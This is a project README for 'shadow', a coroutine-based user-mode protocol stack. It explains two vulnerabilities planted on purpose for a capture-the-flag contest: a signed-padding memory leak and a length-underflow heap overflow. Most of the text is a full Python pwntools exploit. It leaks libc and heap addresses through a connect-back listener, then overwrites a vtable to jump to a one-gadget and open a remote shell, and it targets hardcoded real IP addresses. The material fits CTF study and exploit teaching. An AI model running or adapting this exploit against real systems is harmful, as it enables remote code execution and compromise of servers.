# shadow
The target of this project is to build a user-mode protocol stack. I use coroutine for the support of asyncio and wapper the detail of network transport. So it's will be easy to extern a protocol.

## RWCTF
In the commit tag RWCTF, I set two vulnerabilities for exploit. Both two vulnerabilities are in function SC::dec_proto. 
The first one is  [here](https://github.com/zh-explorer/shadow/blob/master/proto/SC.cpp#L180). The should be a pkcs5 padding for block cipher. But the type of dec_data is signed char * so the auto type will be signed char. So negative padding will cause a memory leak. We can leak heap bash, libc bash and so on from it.

The second one is [here](https://github.com/zh-explorer/shadow/blob/master/proto/SC.cpp#L146). We can control the pack's length and random_len filed and make data_size to -1. This will cause an infinite read. Because of the coroutine, the read will be blocked and run other code when we do not send any data to socket fd. The heap overflow will overwrite some vtable use by another coroutine. Then we can set PC to one gadget get a shell.

By the way, the heap layout is always unstable. So we need some heap spray technology to fill heap with one gadget.

```python
import pwn
import time
import crypto_tools
import socket
import struct
import sys

#pwn.context.proxy = "127.0.0.1"
#pwn.context.log_level = 'debug'
password = 'meiyoumima'

def create_pack(data):
    timestamp = crypto_tools.packed_timestamp()
    noise = crypto_tools.random_byte(8)
    token = crypto_tools.sha256(password + timestamp[::-1] + noise)[:16]
    random_len = 10

    data_len = random_len + len(data) + 80

    data_buf = bytearray()
    data_buf += timestamp[::-1] + noise
    data_buf.append(1)
    data_buf += struct.pack(b'!L', data_len)[::-1]

    data_buf.append(random_len)
    data_buf += crypto_tools.random_byte(10)

    random_data = '\x00'.ljust(random_len,'\x00')
    random_data = bytearray(random_data)

    data_buf += crypto_tools.sha256(token+data_buf+'\x00'*32+data+'\x00'*random_len)
    data_buf += data

    aes = crypto_tools.AES(token)

    data_buf = token + aes.encrypt(bytes(data_buf))
    data_buf += random_data

    return data_buf

def padding(data):
    pad_len = 16 - len(data)%16;
    return data + chr(pad_len)*pad_len

def leak(size):
    global libc_base
    global heap_base
    p = pwn.remote("54.153.22.136", port)
    l = pwn.listen(9999)
    
    ip = socket.inet_aton("40.73.17.40")
    #ip = socket.inet_aton("47.112.138.86")
    rport = pwn.p16(socket.htons(9999))
    
    pack =  '\x01\x01\x01' + ip + rport
    pack = padding(pack)
    
    pay = create_pack(pack)
    p.send(pay)
    
    s = l.wait_for_connection()
    
    p.recv()
    
    pack = 'a'*size+'\x80'*0x10
    pay = create_pack(pack)
    p.send(pay)

    data = l.recv()
    print data.encode('hex')
    if size == 0x100:
        libc_base = pwn.u64(data[288:288+8]) - 0x3ebca0
    if size == 0x10:
        heap_base = pwn.u64(data[72:80]) - 83120 - 0x410
    
    l.close()
    p.close()

def overflow():
    p1 = pwn.remote('54.153.22.136', port)
    p2 = pwn.remote("54.153.22.136", port)

    timestamp = crypto_tools.packed_timestamp()
    noise = crypto_tools.random_byte(8)
    token = crypto_tools.sha256(password + timestamp[::-1] + noise)[:16]
    random_len = 10
    data_buf = bytearray()
    data_buf += timestamp[::-1] + noise
    data_buf.append(1)
    data_buf += struct.pack(b'!L', 89)[::-1]
    data_buf.append(random_len)
    data_buf += crypto_tools.random_byte(10)
    data_buf += "\x00"*32

    aes = crypto_tools.AES(token)

    data_buf = token + aes.encrypt(bytes(data_buf))

    p1.send(data_buf)
    
    p2.send('aaa')

    data = pwn.p64(one_gadget) + 'a'*24 + pwn.p64(magic-0x10) + pwn.cyclic(0x100, n = 8)
    p1.send(data)

    p1.interactive()


port = int(sys.argv[1])
libc_base = 100
heap_base = 100

leak(0x10)
leak(0x100)

print hex(libc_base)
print hex(heap_base)

one_gadget = libc_base+0x4f322
magic = heap_base+0x217d10-0x20
overflow()
```